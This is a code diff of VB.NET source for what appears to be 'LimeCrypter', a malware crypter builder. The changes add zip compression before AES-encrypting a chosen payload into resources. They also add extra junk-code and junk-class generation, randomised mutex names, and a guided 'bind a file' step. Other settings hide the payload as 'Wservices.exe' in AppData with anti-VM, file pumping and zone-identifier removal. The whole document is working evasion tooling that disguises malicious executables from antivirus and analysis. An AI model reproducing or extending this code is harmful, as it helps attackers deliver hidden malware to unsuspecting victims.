@@ -77,11 +77,7 @@
     End Sub
 
     Private Sub chkDelay_Click(sender As Object, e As EventArgs) Handles chkDelay.Click
-        If chkDelay.Checked = True Then
-            numDelay.Enabled = True
-        Else
-            numDelay.Enabled = False
-        End If
+        '
     End Sub
 
 
@@ -246,8 +242,8 @@
                 Source = Replace(Source, "%DecAdd%", Helper.Randomi(Helper.rand.Next(6, 12)))
                 Source = Replace(Source, "%DecDLL%", Helper.Randomi(Helper.rand.Next(6, 12)))
                 Source = Replace(Source, "%DLL%", Helper.Randomi(Helper.rand.Next(6, 12)))
-                Source = Replace(Source, "%STRHEX%", Helper.Randomi(Helper.rand.Next(6, 12)))
-                Source = Replace(Source, "%STRHEXFunc%", Helper.Randomi(Helper.rand.Next(6, 12)))
+                Source = Replace(Source, "%PYLD%", Helper.Randomi(Helper.rand.Next(6, 12)))
+                Source = Replace(Source, "%ZIP%", Helper.Randomi(Helper.rand.Next(6, 12)))
                 Source = Replace(Source, "%J%", Helper.Randomi(Helper.rand.Next(6, 12)))
                 Source = Replace(Source, "%N%", Helper.Randomi(Helper.rand.Next(6, 12)))
                 Source = Replace(Source, "%V%", Helper.Randomi(Helper.rand.Next(6, 12)))
@@ -265,11 +261,19 @@
                 Source = Replace(Source, "%Task%", Helper.Randomi(Helper.rand.Next(6, 12)))
                 Source = Replace(Source, "%pr%", Helper.Randomi(Helper.rand.Next(6, 12)))
                 Source = Replace(Source, "%VM%", Helper.Randomi(Helper.rand.Next(6, 12)))
-                Source = Replace(Source, "%Delay%", numDelay.Value)
+                Source = Replace(Source, "%Mutex%", Helper.Randomi(Helper.rand.Next(6, 12)))
+                Source = Replace(Source, "%createdNew%", Helper.Randomi(Helper.rand.Next(6, 12)))
 
-                Source = Replace(Source, "%JUNK1%", GenerateJunk(RandomNumber(2, 5)))
-                Source = Replace(Source, "%JUNK2%", GenerateJunk(RandomNumber(2, 6)))
-                Source = Replace(Source, "%JUNK3%", GenerateJunk(RandomNumber(2, 7)))
+                Source = Replace(Source, "%JUNK1%", GenerateJunk(RandomNumber(1, 2)))
+                Source = Replace(Source, "%JUNK2%", GenerateJunk(RandomNumber(1, 3)))
+                Source = Replace(Source, "%JUNK3%", GenerateJunk(RandomNumber(1, 2)))
+                Source = Replace(Source, "%JUNK4%", GenerateJunk(RandomNumber(1, 3)))
+                Source = Replace(Source, "%JUNK5%", GenerateJunk(RandomNumber(1, 2)))
+                Source = Replace(Source, "%JUNK6%", GenerateJunk(RandomNumber(1, 2)))
+
+                Source = Replace(Source, "%JUNK7%", GenerateJunkClass(RandomNumber(1, 2)))
+                Source = Replace(Source, "%JUNK8%", GenerateJunkClass(RandomNumber(1, 2)))
+
 
                 Source = Replace(Source, "%Info%", Helper.Randomi(Helper.rand.Next(6, 12)))
 
@@ -335,15 +339,14 @@
                 If chkDelay.Checked = True Then
                     txtLog.AppendText("Addign Delay..." + Environment.NewLine)
                     Source = Replace(Source, "'$Delay%", Nothing)
-                    Source = Replace(Source, "%Delay1%", numDelay.Value)
                 End If
 
 
                 Using R As New Resources.ResourceWriter(IO.Path.GetTempPath & "\" + ResName + ".Resources")
-                    R.AddResource(ResPayload, Algorithm.AES_Encrypt(Convert.ToBase64String((IO.File.ReadAllBytes(txtPayload.Text))), Main.Key))
-                    R.AddResource(ResDLL, Algorithm.AES_Encrypt(Convert.ToBase64String(My.Resources.PE), Main.Key))
+                    R.AddResource(ResPayload, Algorithm.AES_Encrypt(Convert.ToBase64String(Helper.ZIP(IO.File.ReadAllBytes(txtPayload.Text), True)), Main.Key))
+                    R.AddResource(ResDLL, Algorithm.AES_Encrypt(Convert.ToBase64String(Helper.ZIP(My.Resources.PE, True)), Main.Key))
                     If chkBind.Checked = True AndAlso IO.File.Exists(txtBind.Text) = True Then
-                        R.AddResource(ResBind, Algorithm.AES_Encrypt(Convert.ToBase64String(IO.File.ReadAllBytes(txtBind.Text)), Main.Key))
+                        R.AddResource(ResBind, Algorithm.AES_Encrypt(Convert.ToBase64String(Helper.ZIP(IO.File.ReadAllBytes(txtBind.Text), True)), Main.Key))
                     End If
                     R.Generate()
                 End Using
@@ -373,13 +376,21 @@
             txtDropName.Text = "Wservices.exe"
             txtDropPath.Text = "Appdata"
 
+            Dim result As DialogResult
+            result = MessageBox.Show("Do you want to bind a file?", "LimeCrypter", MessageBoxButtons.YesNo)
+            If result = DialogResult.Yes Then
+                chkBind.Checked = True
+                chkBindOnce.Checked = True
+                btnBind_Click(btnBind, e)
+            End If
+
             chkAntiTask.Checked = False
-            chkAntiVM.Checked = True
+            chkAntiVM.Checked = False
             chkAntiWireshark.Checked = False
 
             chkZoneIden.Checked = True
             chkPump.Checked = True : numPump.Value = 200
-            chkDelay.Checked = True : numDelay.Value = 60
+            chkDelay.Checked = True
 
             chkAssembly.Checked = True
             btnAssemblyRandom_Click(btnAssemblyRandom, e)
@@ -388,7 +399,9 @@
             MsgBox("Select Icon")
             picIcon_Click(picIcon, e)
 
-            MsgBox("Done! Take a look at settings before build it", MsgBoxStyle.Information)
+            PvTabControl_Side1.SelectTab(3)
+            MsgBox("Save Output")
+            btnBuild_Click(btnBuild, e)
         Catch ex As Exception
         End Try
     End Sub
